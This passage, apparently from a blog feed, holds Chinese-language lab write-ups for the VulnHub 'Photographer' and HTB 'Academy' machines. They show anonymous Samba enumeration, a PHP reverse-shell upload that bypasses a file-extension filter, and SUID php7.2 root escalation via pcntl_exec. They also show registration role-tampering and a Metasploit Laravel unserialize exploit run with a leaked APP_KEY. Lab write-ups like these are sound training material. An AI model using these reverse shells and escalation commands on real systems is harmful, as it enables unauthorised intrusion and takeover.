============================== </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span><br><span class="line"></span><br><span class="line"> ========================================== </span><br><span class="line">|    Share Enumeration on 192.168.1.135    |</span><br><span class="line"> ========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.1.135</span><br><span class="line">//192.168.1.135/print$  Mapping: DENIED, Listing: N/A</span><br><span class="line">//192.168.1.135/sambashare      Mapping: OK, Listing: OK</span><br><span class="line">//192.168.1.135/IPC$    [E] Can&#x27;t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ===================================================== </span><br><span class="line">|    Password Policy Information for 192.168.1.135    |</span><br><span class="line"> ===================================================== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..........(省略部分无关紧要的内容)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.135    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Fri Dec 18 06:45:30 2020</span><br><span class="line"></span><br><span class="line">root@JIYE:~#</span><br></pre></td></tr></table></figure><p><code>可以发现samba服务的一个目录sambashare</code></p><blockquote><p>//192.168.1.135/sambashare      Mapping: OK, Listing: OK</p></blockquote><p><code>匿名直接连接进行查看，发现一个wordpress站点的备份文件和一个txt文件</code></p><img src="/2020/12/18/Photographer/image-20201218195708592.png" class><p><code>根据文件名mailsent.txt文件是一封发送的邮件，内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#x27;s</span><br><span class="line">Content-Type: text/plain; charset=us-ascii; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#x27;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><p><code>可以看到邮箱为daisa@photographer.com</code></p><p><code>还有邮件内容为你的网站现在准备好了，不要忘记你的密码my babygirl</code></p><p><code>这里推测密码为babygirl，所以尝试登入，OK推测正确</code></p><img src="/2020/12/18/Photographer/image-20201218200838692.png" class><h2 id="0x08-上传文件，反弹shell"><a href="#0x08-上传文件，反弹shell" class="headerlink" title="0x08.上传文件，反弹shell"></a>0x08.上传文件，反弹shell</h2><p><code>本次使用kali自带reverse shell路径(/usr/share/webshells/php/php-reverse-shell.php)</code></p><p><code>将IP修改为kali本身，端口为6666</code></p><img src="/2020/12/18/Photographer/image-20201218201703596.png" class><p><code>上传</code></p><img src="/2020/12/18/Photographer/image-20201218202118418.png" class><p><code>结果仅仅可以上传JPG、PNG、GIF、MP4格式文件，所以先修改文件后缀</code></p><img src="/2020/12/18/Photographer/image-20201218202345783.png" class><p><code>进行上传</code></p><img src="/2020/12/18/Photographer/image-20201218202606655.png" class><p><code>抓包将后缀改回php</code></p><img src="/2020/12/18/Photographer/image-20201218203003281.png" class><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>点击反弹shell</code></p><img src="/2020/12/18/Photographer/image-20201218203246226.png" class><img src="/2020/12/18/Photographer/image-20201218203335202.png" class><p><code>成功get shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.129] from (UNKNOWN) [192.168.1.135] 56236</span><br><span class="line">Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"> 15:33:07 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><p><code>首先升级shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>升级交互shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">www-data@photographer:/$ </span><br><span class="line">www-data@photographer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@photographer:/$</span><br></pre></td></tr></table></figure><p><code>在daisa找到user.txt的flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ cat user.txt </span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><code>suid提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>可以发现php7.2可以利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/home/daisa$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/php7.2</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">www-data@photographer:/home/daisa$</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGhwLw==">提权参考<i class="fa fa-external-link-alt"></i></span></p><p><code>找到php7.2命令的目录，在/usr/bin/php7.2</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/$ whereis php7.2</span><br><span class="line">php7: /usr/bin/php7.2 /usr/share/php7.2-mysql /usr/share/php7.2-opcache /usr/share/php7.2-xmlrpc /usr/share/php7.2-json /usr/share/php7.2-readline /usr/share/php7.2-curl /usr/share/php7.2-common /usr/share/php7.2-sqlite3 /usr/share/php7.2-zip /usr/share/php7.2-intl /usr/share/php7.2-xml /usr/share/php7.2-gd /usr/share/php7.2-mbstring</span><br><span class="line">www-data@photographer:/$ </span><br></pre></td></tr></table></figure><p><code>exploit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/usr/bin$ ./php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment"># id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~  </span></span><br><span class="line">/bin/sh: 5: cd: can&#x27;t cd to ~</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat proof.txt</span></span><br><span class="line">                                                                   </span><br><span class="line">                                .:/://::::///:-`                                </span><br><span class="line">                            -/++:+`:--:o:  oo.-/+/:`                            </span><br><span class="line">                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         </span><br><span class="line">                       :o:``oyo/o`. `      ```/-so:+--+/`                       </span><br><span class="line">                     -o:-`yh//.                 `./ys/-.o/                      </span><br><span class="line">                    ++.-ys/:/y-                  /s-:/+/:/o`                    </span><br><span class="line">                   o/ :yo-:hNN                   .MNs./+o--s`                   </span><br><span class="line">                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   </span><br><span class="line">                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  </span><br><span class="line">                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  </span><br><span class="line">                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 </span><br><span class="line">                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  </span><br><span class="line">                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  </span><br><span class="line">                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   </span><br><span class="line">                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    </span><br><span class="line">                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     </span><br><span class="line">                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       </span><br><span class="line">                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         </span><br><span class="line">                           -/+/-:-/y+/d:yh-o:+--/+/:`                           </span><br><span class="line">                              `-///////////////:`                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http://v1n1v131r4.com</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-官网描述&quot;&gt;&lt;a href=&quot;#0x00-官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00.官网描述&quot;&gt;&lt;/a&gt;0x00.官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[academy]</title>
    <link href="https://lunamoore.github.io/2020/12/09/HTB-academy/"/>
    <id>https://lunamoore.github.io/2020/12/09/HTB-academy/</id>
    <published>2020-12-09T11:54:07.000Z</published>
    <updated>2020-12-09T12:00:20.299Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2020/12/09/HTB-academy/image-20201209140730144.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了22、80端口，域名为academy.htb及服务器等信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# nmap -sC -sV -sT 10.10.10.215 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 01:02 EST</span><br><span class="line">Nmap scan report for academy.htb (10.10.10.215)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)</span><br><span class="line">|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)</span><br><span class="line">|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Hack The Box Academy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.43 seconds</span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>首先添加一条hosts [10.10.10.215    academy.htb]，发现一个登入与一个注册框</code></p><img src="/2020/12/09/HTB-academy/image-20201209144619918.png" class><p><code>注册一个账号并登入，手动爬虫，没有什么可用的信息</code></p><img src="/2020/12/09/HTB-academy/image-20201209151326705.png" class><h2 id="0x03-列出目录（403-404）"><a href="#0x03-列出目录（403-404）" class="headerlink" title="0x03.列出目录（403/404）"></a>0x03.列出目录（403/404）</h2><p><code>使用wfuzz进行模糊测试</code></p><blockquote><p>得到以下目录</p><p>config</p><p>admin</p><p>index</p><p>home</p><p>login</p><p>register</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# wfuzz -u http://academy.htb/FUZZ.php -w /usr/share/wordlists/dirb/small.txt --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http://academy.htb/FUZZ.php</span><br><span class="line">Total requests: 959</span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line">000000213:   200        0 L      0 W      0 Ch        &quot;config&quot;</span><br><span class="line">000000059:   200        141 L    227 W    2633 Ch     &quot;admin&quot;</span><br><span class="line">000000434:   200        76 L     131 W    2117 Ch     &quot;index&quot;</span><br><span class="line">000000411:   302        1049 L   4114 W   55034 Ch    &quot;home&quot;</span><br><span class="line">000000498:   200        141 L    226 W    2627 Ch     &quot;login&quot; </span><br><span class="line">000000684:   200        148 L    247 W    3003 Ch     &quot;register&quot;                    </span><br><span class="line">Total time: 9.694324</span><br><span class="line">Processed Requests: 959</span><br><span class="line">Filtered Requests: 953</span><br><span class="line">Requests/sec.: 98.92385</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/academy#</span><br></pre></td></tr></table></figure><h2 id="0x04-查看register目录源码"><a href="#0x04-查看register目录源码" class="headerlink" title="0x04.查看register目录源码"></a>0x04.查看register目录源码</h2><p><code>发现了隐藏域</code></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Ny9hcnRpY2xlL2RldGFpbHMvMTAzNjYwNzQz">隐藏域参考1<i class="fa fa-external-link-alt"></i></span></strong></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbHVzaHVpY29uZ3NoZW5nL2FyY2hpdmUvMjAxMS8wNS8wOS8yMDQwOTk0Lmh0bWw=">隐藏域参考2<i class="fa fa-external-link-alt"></i></span></strong></p><img src="/2020/12/09/HTB-academy/image-20201209171550454.png" class><h2 id="0x05-bp抓包"><a href="#0x05-bp抓包" class="headerlink" title="0x05.bp抓包"></a>0x05.bp抓包</h2><p><code>修改roleid的值为1，向后台传值，且用户名后也需要加1；发送，http状态码需要为200</code></p><img src="/2020/12/09/HTB-academy/image-20201209171903646.png" class><h2 id="0x06-访问admin目录"><a href="#0x06-访问admin目录" class="headerlink" title="0x06.访问admin目录"></a>0x06.访问admin目录</h2><h3 id="1-demo1登入"><a href="#1-demo1登入" class="headerlink" title="1.demo1登入"></a>1.demo1登入</h3><img src="/2020/12/09/HTB-academy/image-20201209172159741.png" class><h3 id="2-登入成功"><a href="#2-登入成功" class="headerlink" title="2.登入成功"></a>2.登入成功</h3><p><code>可以看到解决dev-staging-01.academy.htb的问题在推迟中，与两个用户</code></p><blockquote><p>cry0I1t3</p><p>mrb3n</p></blockquote><img src="/2020/12/09/HTB-academy/image-20201209182821986.png" class><h3 id="3-访问dev-staging-01-academy-htb（需添加hosts）"><a href="#3-访问dev-staging-01-academy-htb（需添加hosts）" class="headerlink" title="3.访问dev-staging-01.academy.htb（需添加hosts）"></a>3.访问dev-staging-01.academy.htb（需添加hosts）</h3><p><code>发现服务器敏感信息，应用为Laravel</code></p><img src="/2020/12/09/HTB-academy/image-20201209173106569.png" class><h2 id="0x07-Google搜索Laravel-exp进行利用"><a href="#0x07-Google搜索Laravel-exp进行利用" class="headerlink" title="0x07.Google搜索Laravel exp进行利用"></a>0x07.Google搜索Laravel exp进行利用</h2><p><code>发现可以使用MSF进行利用</code></p><img src="/2020/12/09/HTB-academy/image-20201209173353304.png" class><h2 id="0x08-msf利用"><a href="#0x08-msf利用" class="headerlink" title="0x08.msf利用"></a>0x08.msf利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/academy# msfconsole -q</span><br><span class="line">msf5 &gt; </span><br><span class="line">msf5 &gt; search Laravel</span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution</span><br><span class="line"></span><br><span class="line">msf5 &gt; use 0</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; </span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Path to target webapp</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><h3 id="1-设置本端主机"><a href="#1-设置本端主机" class="headerlink" title="1.设置本端主机"></a>1.设置本端主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.17.216  </span><br></pre></td></tr></table></figure><h3 id="2-设置对端主机"><a href="#2-设置对端主机" class="headerlink" title="2.设置对端主机"></a>2.设置对端主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set rhosts academy.htb</span><br><span class="line">rhosts =&gt; academy.htb</span><br></pre></td></tr></table></figure><h3 id="3-设置app-key"><a href="#3-设置app-key" class="headerlink" title="3.设置app_key"></a>3.设置app_key</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">app_key =&gt; dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= </span><br></pre></td></tr></table></figure><h3 id="4-设置虚拟主机"><a href="#4-设置虚拟主机" class="headerlink" title="4.设置虚拟主机"></a>4.设置虚拟主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; set vhost dev-staging-01.academy.htb</span><br><span class="line">vhost =&gt; dev-staging-01.academy.htb</span><br></pre></td></tr></table></figure><h3 id="5-exploit得到shell"><a href="#5-exploit得到shell" class="headerlink" title="5.exploit得到shell"></a>5.exploit得到shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 